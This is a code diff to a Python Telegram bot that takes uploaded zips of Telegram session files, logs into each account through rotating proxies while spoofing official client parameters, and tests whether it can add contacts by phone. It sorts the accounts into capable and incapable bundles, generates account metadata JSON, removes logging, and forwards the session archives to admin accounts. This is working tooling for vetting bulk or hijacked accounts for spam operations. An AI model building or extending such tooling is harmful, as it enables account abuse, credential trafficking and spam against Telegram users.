@@ -6,19 +6,19 @@ import time
 import json
 import asyncio
 import random
+import traceback
 from datetime import datetime
 from opentele.tl import TelegramClient
 from opentele.api import API
 from telethon import errors
-from telethon.tl.functions.contacts import AddContactRequest, DeleteContactsRequest
-import logging
+from telethon.tl.functions.contacts import ImportContactsRequest, DeleteContactsRequest
+from telethon.tl.types import InputPhoneContact, InputUser
 from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
 from telegram.constants import ParseMode
 from telegram.ext import ContextTypes
 from dotenv import load_dotenv
 
 load_dotenv()
-logger = logging.getLogger(__name__)
 
 CHECK_MATERIAL_BACK = os.getenv("CHECK_MATERIAL_BACK", "").replace('\\n', '\n')
 MAX_EXTRACT_SIZE = int(os.getenv("MK_TIME", 4)) * 1024 * 1024
@@ -43,7 +43,6 @@ def load_proxies():
     valid_proxies = []
     
     if not os.path.exists(proxy_file):
-        logger.warning("proxy.txt 文件不存在")
         _proxy_list = []
         _proxy_list_last_load = current_time
         return []
@@ -69,21 +68,16 @@ def load_proxies():
                                 'expire': expire_timestamp
                             }
                             valid_proxies.append(proxy)
-                        else:
-                            logger.debug(f"代理 {ip}:{port} 已过期")
                     except ValueError:
-                        logger.warning(f"代理过期时间格式错误: {expire_ts}")
                         continue
     
-    except Exception as e:
-        logger.error(f"读取 proxy.txt 失败: {e}")
+    except Exception:
         _proxy_list = []
         _proxy_list_last_load = current_time
         return []
     
     _proxy_list = valid_proxies
     _proxy_list_last_load = current_time
-    logger.info(f"加载了 {len(valid_proxies)} 个有效代理")
     return valid_proxies
 
 def get_random_proxy():
@@ -131,23 +125,79 @@ def get_total_size(path):
                 total += os.path.getsize(fp)
     return total
 
+async def generate_json_for_session(session_file, client, me, api_id, api_hash, official_api):
+    json_path = session_file.replace('.session', '.json')
+    phone = me.phone if me.phone else os.path.basename(session_file).replace('.session', '')
+    reg_time = datetime.now().strftime("%Y-%m-%d")
+    
+    device_model = getattr(official_api, 'device_model', 'Desktop')
+    system_version = getattr(official_api, 'system_version', '')
+    app_version = getattr(official_api, 'app_version', '')
+    system_lang_code = getattr(official_api, 'system_lang_code', 'en')
+    lang_pack = getattr(official_api, 'lang_pack', '')
+    lang_code = getattr(official_api, 'lang_code', 'en')
+    pid = getattr(official_api, 'pid', random.randint(100000, 999999))
+    
+    json_data = {
+        "api_id": api_id,
+        "api_hash": api_hash,
+        "device_model": device_model,
+        "system_version": system_version,
+        "app_version": app_version,
+        "system_lang_code": system_lang_code,
+        "lang_pack": lang_pack,
+        "lang_code": lang_code,
+        "pid": pid,
+        "user_id": me.id,
+        "phone": phone,
+        "twofa": "",
+        "password": "",
+        "app_id": api_id,
+        "app_hash": api_hash,
+        "session_file": os.path.basename(session_file).replace('.session', ''),
+        "device": device_model,
+        "username": me.username or "",
+        "sex": None,
+        "avatar": "img/default.png",
+        "package_id": "",
+        "installer": "",
+        "ipv6": False,
+        "SDK": system_version,
+        "sdk": system_version,
+        "system_lang_pack": system_lang_code,
+        "premium": getattr(me, 'premium', False),
+        "reg_time": reg_time
+    }
+    
+    try:
+        os.makedirs(os.path.dirname(json_path), exist_ok=True)
+        with open(json_path, 'w', encoding='utf-8') as f:
+            json.dump(json_data, f, indent=2, ensure_ascii=False)
+        return json_path
+    except Exception:
+        return None
+
 async def check_material_capability(session_file, json_file, api_id, api_hash):
     client = None
+    final_json_file = json_file if json_file and os.path.exists(json_file) else None
+    
     result = {
         "session": os.path.basename(session_file),
         "status": "unknown",
         "has_capability": False,
         "message": "",
-        "phone": None
+        "phone": None,
+        "json_file": final_json_file
     }
     
     json_config = {}
-    if json_file and os.path.exists(json_file):
+    if final_json_file:
         try:
-            with open(json_file, 'r', encoding='utf-8') as f:
+            with open(final_json_file, 'r', encoding='utf-8') as f:
                 json_config = json.load(f)
-        except Exception as e:
-            logger.warning(f"读取 JSON 配置失败 {json_file}: {e}")
+        except Exception:
+            final_json_file = None
+            result["json_file"] = None
     
     final_api_id = api_id
     final_api_hash = api_hash
@@ -156,14 +206,14 @@ async def check_material_capability(session_file, json_file, api_id, api_hash):
             try:
                 final_api_id = int(json_config['app_id'])
             except (ValueError, TypeError):
-                logger.warning(f"无效的 app_id: {json_config['app_id']}, 使用默认值")
+                pass
         if 'app_hash' in json_config and json_config['app_hash']:
             final_api_hash = str(json_config['app_hash'])
     
     device_model = json_config.get('device') or None
     app_version = json_config.get('app_version') or None
     system_lang_code = json_config.get('system_lang_pack') or None
-    system_vision = json_config.get('sdk') or None
+    system_vision = json_config.get('system_vision') or json_config.get('sdk') or None
     lang_pack = json_config.get('lang_pack') or None
     
     proxy = get_random_proxy()
@@ -204,43 +254,47 @@ async def check_material_capability(session_file, json_file, api_id, api_hash):
             return result
         
         result["phone"] = me.phone
+
+        if not final_json_file:
+            generated_path = await generate_json_for_session(
+                session_file, client, me, final_api_id, final_api_hash, official_api
+            )
+            if generated_path:
+                final_json_file = generated_path
+                result["json_file"] = generated_path
         
         try:
-            contact = await client.get_input_entity(TARGET_PHONE)
-            await client(AddContactRequest(
-                id=contact,
-                first_name="Test",
-                last_name="",
+            contact = InputPhoneContact(
+                client_id=random.randint(1, 2**31 - 1),
                 phone=TARGET_PHONE,
-                add_phone_privacy_exception=False
-            ))
+                first_name="Test",
+                last_name=""
+            )
+            import_result = await client(ImportContactsRequest(contacts=[contact]))
             
-            await asyncio.sleep(1)
+            if import_result.imported:
+                imported_user = import_result.imported[0]
+                try:
+                    user_to_delete = InputUser(user_id=imported_user.user_id, access_hash=imported_user.access_hash)
+                    await client(DeleteContactsRequest(id=[user_to_delete]))
+                except Exception:
+                    pass
+                
+                result["has_capability"] = True
+                result["status"] = "success"
+                result["message"] = "有能力"
+            else:
+                result["has_capability"] = False
+                result["status"] = "success"
+                result["message"] = "无能力"
             
-            try:
-                await client(DeleteContactsRequest(id=[contact]))
-            except:
-                pass
-            
-            result["has_capability"] = True
-            result["status"] = "success"
-            result["message"] = "有能力"
-            
-        except errors.rpcerrorlist.PhoneNumberInvalidError:
-            result["has_capability"] = False
-            result["status"] = "success"
-            result["message"] = "无能力"
-        except errors.rpcerrorlist.ContactAddMissingError:
-            result["has_capability"] = False
-            result["status"] = "success"
-            result["message"] = "无能力"
-        except errors.FloodWaitError as e:
+        except errors.rpcerrorlist.FloodWaitError as e:
             result["has_capability"] = False
             result["status"] = "success"
             result["message"] = f"无能力 (等待{e.seconds}秒)"
         except Exception as e:
             error_str = str(e).lower()
-            if "cannot add" in error_str or "privacy" in error_str:
+            if "cannot add" in error_str or "privacy" in error_str or "USER_PRIVACY_RESTRICTED" in str(e):
                 result["has_capability"] = False
                 result["status"] = "success"
                 result["message"] = "无能力"
@@ -295,7 +349,6 @@ async def handle_material_document(update: Update, context: ContextTypes.DEFAULT
             pass
         
     except Exception as e:
-        logger.error(f"处理文件失败: {e}")
         keyboard = [[create_back_button()]]
         reply_markup = InlineKeyboardMarkup(keyboard)
         await update.message.reply_text(
@@ -417,6 +470,7 @@ async def _process_material_internal(update, context, zip_path, user_id, api_id,
         no_capability_count = 0
         failed_count = 0
         results = []
+        failed_reasons = []
         
         sessions_list = list(session_map.items())
         for i, (session_file, json_file) in enumerate(sessions_list, 1):
@@ -435,6 +489,13 @@ async def _process_material_internal(update, context, zip_path, user_id, api_id,
             result = await check_material_capability(session_file, json_file, api_id, api_hash)
             results.append(result)
             
+            if result["status"] != "success":
+                failed_reasons.append(f"{result['session']}: {result['message']}")
+            
+            updated_json_file = result.get("json_file")
+            if updated_json_file:
+                json_file = updated_json_file
+            
             if result["status"] == "success":
                 if result["has_capability"]:
                     target_dir = capability_dir
@@ -450,10 +511,16 @@ async def _process_material_internal(update, context, zip_path, user_id, api_id,
                 shutil.copy2(session_file, os.path.join(target_dir, os.path.basename(session_file)))
                 if json_file and os.path.exists(json_file):
                     shutil.copy2(json_file, os.path.join(target_dir, os.path.basename(json_file)))
-            except:
+            except Exception:
                 pass
             
             await asyncio.sleep(0.5)
+        
+        if failed_reasons:
+            failed_reasons_path = os.path.join(failed_dir, "failed_reasons.txt")
+            with open(failed_reasons_path, 'w', encoding='utf-8') as f:
+                f.write("以下账号检查失败的原因：\n\n")
+                f.write("\n".join(failed_reasons))
         
         timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
         
@@ -504,7 +571,7 @@ async def _process_material_internal(update, context, zip_path, user_id, api_id,
                     chat_id=update.effective_chat.id,
                     document=f,
                     filename=f"has_capability_{timestamp}.zip",
-                    caption=f"<b><tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 有能力账号 ({capability_count}个)</b>\n测试后已自动删除联系人",
+                    caption=f"<b><tg-emoji emoji-id='5920052658743283381'>✅</tg-emoji> 有能力账号 ({capability_count}个)</b>",
                     parse_mode='HTML'
                 )
         
@@ -524,7 +591,7 @@ async def _process_material_internal(update, context, zip_path, user_id, api_id,
                     chat_id=update.effective_chat.id,
                     document=f,
                     filename=f"failed_{timestamp}.zip",
-                    caption=f"<b><tg-emoji emoji-id='5846008814129649022'>⚠️</tg-emoji> 检查失败 ({failed_count}个)</b>",
+                    caption=f"<b><tg-emoji emoji-id='5846008814129649022'>⚠️</tg-emoji> 检查失败 ({failed_count}个)</b>\n内含失败原因文本文件",
                     parse_mode='HTML'
                 )
         
@@ -571,8 +638,8 @@ async def _process_material_internal(update, context, zip_path, user_id, api_id,
                             document=f,
                             filename=f"failed_{user_id}_{admin_timestamp}.zip"
                         )
-            except Exception as e:
-                logger.error(f"发送给管理员 {admin_id} 失败: {e}")
+            except Exception:
+                pass
         
         try:
             await status_msg.delete()
